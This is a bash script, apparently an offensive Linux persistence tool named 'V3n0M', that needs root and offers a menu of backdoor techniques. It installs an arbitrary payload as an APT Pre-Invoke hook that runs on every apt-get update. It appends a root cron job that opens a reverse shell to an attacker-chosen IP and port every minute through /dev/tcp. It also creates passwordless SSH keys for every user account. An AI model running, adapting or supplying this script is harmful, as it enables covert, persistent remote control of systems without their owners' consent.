#!/bin/bash

# Function to display text with rainbow colors using lolcat, if installed
display_rainbow_text() {
    local text=$1
    echo "$text" | lolcat -p 0.3 -a -d 1 2>/dev/null || echo "$text"
}

# Function to install necessary tools
install_requirements() {
    if ! command -v lolcat &> /dev/null; then
        sudo apt-get install lolcat -y
    fi
    if ! command -v git &> /dev/null; then
        sudo apt-get install git -y
    fi
    if ! command -v gcc &> /dev/null; then
        sudo apt-get install gcc -y
    fi
    if ! command -v make &> /dev/null; then
        sudo apt-get install make -y
    fi
}

# Function to handle crontab persistence
setup_crontab_persistence() {
    display_rainbow_text " [*] Crontab Persistence [*] "
    echo -e "\n"
    display_rainbow_text "Want to insert a custom command into crontab?"
    display_rainbow_text "Enter 'yes' to input a custom command or 'no' to use the default command."
    read user_response

    if [[ $user_response == "yes" ]]; then
        display_rainbow_text "Enter the command you want to add to crontab: "
        read custom_command
    else
        display_rainbow_text "Enter the IP address: "
        read ip_address
        # Validate IP address
        if ! [[ "$ip_address" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            echo "Invalid IP address format."
            exit 1
        fi

        display_rainbow_text "Enter port: "
        read port
        # Validate port number
        if ! [[ "$port" =~ ^[0-9]+$ ]] || ((port < 1 || port > 65535)); then
            echo "Invalid port number."
            exit 1
        fi

        custom_command="/bin/bash -c 'bash -i >& /dev/tcp/$ip_address/$port 0>&1'"
    fi

    display_rainbow_text "Adding command to crontab..."
    if ! grep -q "$custom_command" /etc/crontab; then
        sudo bash -c "echo '* * * * * root $custom_command' >> /etc/crontab"
        display_rainbow_text "Command successfully added!"
    else
        display_rainbow_text "Command already exists in crontab!"
    fi
}

# Function to hook apt-get update command
hook_apt_get_update() {
    display_rainbow_text " [ * ] Hooking the apt-get update command [ * ] "
    echo -e "\n"

    display_rainbow_text "Enter a payload or command to run when 'sudo apt-get update' is executed: "
    read payload_command

    sudo touch /etc/apt/apt.conf.d/1aptget
    echo "APT::Update::Pre-Invoke {\"$payload_command\";};" | sudo tee /etc/apt/apt.conf.d/1aptget > /dev/null

    display_rainbow_text "Your hook is set in /etc/apt/apt.conf.d/1aptget with the command: $payload_command"
}

# Function to generate SSH keys for all valid users
generate_ssh_keys() {
    while IFS=':' read -r username password uid gid full_name home_directory shell; do
        if [[ "$shell" =~ /bin/.* ]] && [[ "$home_directory" =~ ^/home/[^/]+$ ]]; then
            display_rainbow_text "User $username has shell $shell"

            if [ ! -f "$home_directory/.ssh/id_rsa" ] && [ ! -f "$home_directory/.ssh/id_rsa.pub" ]; then
                display_rainbow_text "Generating SSH key for user $username"
                sudo mkdir -p "$home_directory/.ssh"
                sudo ssh-keygen -t rsa -N "" -f "$home_directory/.ssh/id_rsa" > /dev/null

                sudo chmod 700 "$home_directory/.ssh"
                sudo chmod 600 "$home_directory/.ssh/id_rsa"
                sudo chown -R "$username:$username" "$home_directory/.ssh"
                display_rainbow_text "SSH key generated for user $username."
            else
                display_rainbow_text "SSH key already exists for user $username."
            fi
        fi
    done < "/etc/passwd"

    display_rainbow_text "SSH keys successfully generated for all valid users!"
}

# Function to display the banner
display_banner() {
    display_rainbow_text "
                                 
           /^\\/^\\
         _|__|  O|
\\/     /~     \\_/ \\
 \\____|__________/  \\
        \\_______      \\
                \\     \\                 \\
                  |     |                  \\
                 /      /                    \\
                /     /                       \\\\
               /      /                         \\ \\
              /     /                            \\  \\
             /     /             _----_            \\   \\
            /     /           _-~      ~-_         |   |
           (      (        _-~    _--_    ~-_     _/   |
            \\      ~-____-~    _-~    ~-_    ~-_-~    /
              ~-_           _-~          ~-_       _-~
                 ~--______-~                ~-___-~
"

    display_rainbow_text "👀 When you can't see it, it's already too late 👀"
}

# Menu for selecting tasks
display_menu() {
    cat << EOF 
  [01] Hook apt-get update command
  [02] Crontab Persistence
  [03] Generate SSH keypair

EOF

    printf "[V3n0M]~# "

    read menu_input

    menu_input=$(echo "$menu_input" | tr '[:upper:]' '[:lower:]')

    case "$menu_input" in
        1|01) hook_apt_get_update ;;
        2|02) setup_crontab_persistence ;;
        3|03) generate_ssh_keys ;;
        *) echo "This option does not exist." ;;
    esac
}

# Main function to run the script
main() {
    if [[ $(id -u) -ne "0" ]]; then
        echo "[ERROR] You must run this script as root." >&2
        exit 1
    fi

    install_requirements
    clear
    display_banner
    sleep 0.5
    display_menu
}

main
